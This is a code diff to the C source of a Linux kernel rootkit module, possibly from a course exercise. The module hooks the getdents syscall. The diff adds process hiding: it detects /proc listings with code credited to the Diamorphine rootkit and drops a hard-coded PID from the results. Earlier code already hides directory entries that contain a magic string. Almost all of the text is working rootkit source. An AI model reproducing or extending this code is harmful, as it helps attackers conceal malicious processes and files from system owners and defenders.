@@ -7,6 +7,7 @@ Task:
 ## Hide processes ##
 */
 
+#include <linux/version.h>
 #include <linux/err.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
@@ -147,6 +148,13 @@ int goofy_uname(struct utsname *buf){
 	return ret;
 }
 
+int is_hidden_proc(pid_t pid){
+	if (pid == 7918){
+		return 1;
+	}
+	return 0;
+}
+
 int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int count){
 	//Execute original funciton
 	int (*func_ptr)(unsigned int, struct linux_dirent *, unsigned int) = (void *)hooks[1]->trampoline;
@@ -163,8 +171,23 @@ int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int cou
 	struct linux_dirent *cur_dire;
 	copy_from_user(k_dire, dire, ret);
 
-	//Iterate through all of dire
+	struct inode *d_inode;
+	int proc = 0;
 
+	// From the Diamorphine rootkit
+	#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+		d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
+	#else
+		d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+	#endif
+
+	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)){
+		// Check to see if root inode == 1 and is not a device
+		proc = 1;	
+	}
+
+	//Iterate through all of dire
+	
 	for(int i = 0; i < ret;){
 		//Set cur_dire
 		unsigned char *ptr = (unsigned char *)k_dire;
@@ -173,6 +196,8 @@ int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int cou
 		//Check if the cur_dire name contains magic string
 		if(strstr(cur_dire->d_name, "E1e37") != NULL){
 			//DEBUG if does print to buffer
+		}else if(proc && is_hidden_proc(simple_strtoul(cur_dire->d_name, NULL, 10))){
+			//Else if process to hide, hide /proc/pid
 		}else{
 			//Else append it to the ret_dire struct
 			memcpy((void*)ret_dire+new_len, cur_dire, cur_dire->d_reclen);
